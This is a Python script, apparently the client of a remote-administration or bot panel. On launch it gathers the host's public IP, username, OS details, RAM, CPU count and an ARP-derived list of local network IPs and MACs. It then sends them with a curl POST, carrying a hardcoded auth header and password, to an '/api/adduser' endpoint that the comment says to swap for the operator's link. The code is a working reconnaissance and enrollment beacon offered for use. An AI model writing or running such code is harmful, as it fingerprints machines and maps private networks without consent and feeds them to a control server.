import os, psutil, platform
from requests import get

class Connector:
    """ User-Connector example """

    def __init__(con):
        con.api = "http://127.0.0.1:80/api/adduser" # REPLACE THIS WITH YOUR LINK IF IT'S DIFFERENT
        con.data = {}
        con.appendData()

    @staticmethod
    def networkMap() -> str:
        """ Use ARP(-a) to get the local network map """
        ips = ""
        macs = ""
        for device in os.popen("arp -a"):
            if "dynamic" not in device:
                continue
            for device in device.split('\n'):
                if device == '': continue
                ip, _, _, mac, _, _ = device.split('   ')
                ips += f"{ip}%"
                macs += f"{mac}%"
        return ips, macs

    @staticmethod
    def scrapeSYS() -> str:
        """ Simple System Information """
        sys_info = ""
        uname = platform.uname()
        sys_info += f"{uname.system}%{uname.version}%{uname.processor}"
        return sys_info

    @staticmethod
    def ramConverter() -> str:
        """ Convert RAM Bytes to GigaBytes """
        B = psutil.virtual_memory().total
        GB = 1024 ** 3
        return str(int(B / GB))

    def appendData(con) -> None:
        """ Add information to the data dictionary """
        con.data["ip"]  = get("https://icanhazip.com/").text.split('\n')[0]
        con.data["ram"] = con.ramConverter()
        con.data["pcname"] = os.getlogin()
        con.data["cores"]  = str(psutil.cpu_count())
        con.data["sysinfo"]  = con.scrapeSYS()
        con.data["loc_ips"]  = con.networkMap()[0]
        con.data["loc_macs"] = con.networkMap()[1]

    def connectUser(con) -> None:
        """ CURL is used as Pythons 'requests' wasnt working with the Flask API """
        os.system(
            'curl -X POST -H "Content-Type: application/json" -H "auth: standardAuth" -d "{\\"ip\\": \\"' + con.data["ip"] + '\\", \\"password\\": \\"lol123\\", \\"username\\": \\"' + con.data["pcname"] + '\\", \\"pcname\\": \\"%ComputerName%\\", \\"ram\\": \\"' + con.data["ram"] + '\\", \\"localips\\": \\"' + con.data["loc_ips"] + '\\", \\"localmacs\\": \\"' + con.data["loc_macs"] + '\\", \\"cores\\": \\"' + con.data["cores"] + '\\", \\"sysinfo\\": \\"' + con.data["sysinfo"] + '\\"}" http://127.0.0.1:80/api/adduser'
        )

m = Connector()
m.connectUser()
